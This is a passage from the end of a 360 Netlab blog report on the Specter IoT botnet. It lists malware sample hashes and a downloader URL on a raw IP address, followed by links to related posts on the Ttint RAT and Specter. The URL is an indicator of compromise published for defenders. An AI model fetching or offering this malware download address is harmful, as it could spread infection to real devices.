b9ac3d23faba205f74ebd932d8e370d3
c2126977f9f482f290154ea21719330f
c33b585a0dfa5fdb70d27a17ace6ba1f
c51fc1656aa857bb7226e2df969aa72d
cc1b11c6ac6e5bebc4c0e7502b4e1fcd
cc27d6141f8c66e520122e8f2292a940
eda6d2b0837b5e78ae1b0b50f85e3321
</code></pre>
<h4 id="downloader">Downloader</h4>
<pre><code>http://45.76.70.163:80/style/22523419f0404d628d02876e69458fbe.css
</code></pre>
<!--kg-card-end: markdown-->
      </section>



      <div id="disqus_thread" class="disqus-comments gh-canvas"></div>
      <script>
        var disqus_config = function () {
          this.page.url = "https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/";
          this.page.identifier = "ghost-5f6d78c17646030007b2919a"
        };
        (function () {
          var d = document, s = d.createElement('script');
          s.src = 'https://blog-netlab-360.disqus.com/embed.js';
          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    </article>

  </main>


    <aside class="read-more-wrap outer">
      <div class="inner">
        <div class="read-more-feed">
            <article class="read-more-card" 
                  style="background-image: url(/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg)" 
              >
              <header class="read-more-card-header">
                <small class="read-more-card-header-sitetitle">&mdash; 360 Netlab Blog - Network Security Research Lab at 360 &mdash;</small>
                <h3 class="read-more-card-header-title"><a href="/tag/botnet/">Botnet</a></h3>
              </header>
              <div class="read-more-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
              <div class="read-more-card-content">
                <ul>
                  <li><a href="/911s5/">僵尸网络911 S5的数字遗产</a></li>
                  <li><a href="/headsup_xdr33_variant_of_ciahive_emeerges/">Heads up! Xdr33, A Variant Of CIA’s HIVE  Attack Kit Emerges</a></li>
                  <li><a href="/warning-hive-variant-xdr33-is-coming_cn/">警惕：魔改后的CIA攻击套件Hive进入黑灰产领域</a></li>
                </ul>
              </div>
              <footer class="read-more-card-footer">
                <a href="/tag/botnet/">See all 114 posts →</a>
              </footer>
            </article>

          
<article class="post-card post tag-0-day tag-tenda tag-ttint tag-websocket-over-tls tag-router tag-iot tag-honeypot tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/ttint-an-iot-rat-uses-two-0-days-to-spread/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">0-day</span>
        </div>
        <h2 class="post-card-title">
          Ttint: 一款通过2个0-day漏洞传播的IoT远控木马
        </h2>
      </header>
      <div class="post-card-excerpt">本文作者：涂凌鸣，马延龙，叶根深



背景介绍


从2019年11月开始，360Netlab未知威胁检测系统Anglerfish蜜罐节点相继监测到某个攻击者使用2个腾达路由器0-day漏洞传播一个基于Mirai代码开发的远程控制木马（RAT）。


常规的Mirai变种基本都是围绕DDoS做文章，而这个变种不同，在DDoS攻击之外，它针对路由器设备实现了Socket5代理，篡改路由器DNS，设置iptables，执行自定义系统命令等多达12个远程控制功能。


此外，在C2通信层面，它使用WSS (WebSocket over TLS) 协议，一方面这样在流量层面可以规避非常成熟的Mirai流量检测，另一方面可以为C2提供安全加密通信。


在C2本身，攻击者最开始使用了一个Google的云服务IP，其后切换到位于香港的一台托管主机，但是当我们使用网站证书，样本，域名及IP在我们的DNSmon系统里深入扩展关联后，我们看到更多的基础设施IP，更多的样本，和更多的C2域名。


两个0 day，网关设备的12种远控功能，加密流量协议，多次更换的基础设施IP，我们怀疑这个也许不是普通玩</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Genshen Ye
          </div>

          <a href="/author/yegenshen/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2017/10/1662072805.jpg" alt="Genshen Ye" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2020-09-30">Sep 30, 2020</time>
      <span class="post-card-meta-length">12 min read</span>
    </footer>

  </div>

</article>
          
<article class="post-card post tag-iot tag-malware tag-rat tag-chacha20 tag-botnet tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/malware-specter-report/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">IoT</span>
        </div>
        <h2 class="post-card-title">
          幽灵在行动：Specter分析报告
        </h2>
      </header>
      <div class="post-card-excerpt">背景


2020年8月20日，360Netlab未知威胁检测系统捕获了一个通过漏洞传播可疑ELF文件(22523419f0404d628d02876e69458fbe.css)，其独特的文件名，TLS网络流量以及VT杀软0检出的情况，引起了我们的兴趣。


经过分析，我们确定它是一个配置灵活，高度模块化/插件化，使用TLS，ChaCha20，Lz4加密压缩网络通信，针对AVTECH IP Camera / NVR / DVR 设备的恶意家族，我们捕获的ELF是Dropper，会释放出一个Loader,而Loader则会通过加密流量向C2请求各种Plugin以实现不同的功能。样本build路径为/build/arm-specter-linux-uclibcgnueabi，所以我们命名为Specter。


目前来看，Specter有很多不专业的地方，比如，它在释放Loader的同时也释放2个运行时所需要的库，但它们都是dynamically linked。又如下载的Plugin落在文件上再加载而不是在内存中直接展开加载。而且Dropper的传播是利用5年旧的老漏洞；但是在另外一方面，它</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Hui Wang
          </div>

          <a href="/author/huiwang/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2020-09-25">Sep 25, 2020</time>
      <span class="post-card-meta-length">11 min read</span>
    </footer>

  </div>

</article>
        </div>
      </div>
    </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> &copy; 2024</section>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=42b57cac00"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();

    // floating-header
    // Start fitVids
      var $postContent = $(".gh-content");
      $postContent.fitVids();
      // End fitVids

      var progressBar = document.querySelector('#reading-progress');
      var header = document.querySelector('.floating-header');
      var title = document.querySelector('.article-title');

      var lastScrollY = window.scrollY;
      var lastWindowHeight = window.innerHeight;
      var lastDocumentHeight = $(document).height();
      var ticking = false;

      function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
      }

      function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
      }

      function requestTick() {
        if (!ticking) {
          requestAnimationFrame(update);
        }
        ticking = true;
      }

      function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
          header.classList.add('floating-active');
        } else {
          header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
      }

      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('resize', onResize, false);

      update();
});
</script>



</body>
</html>
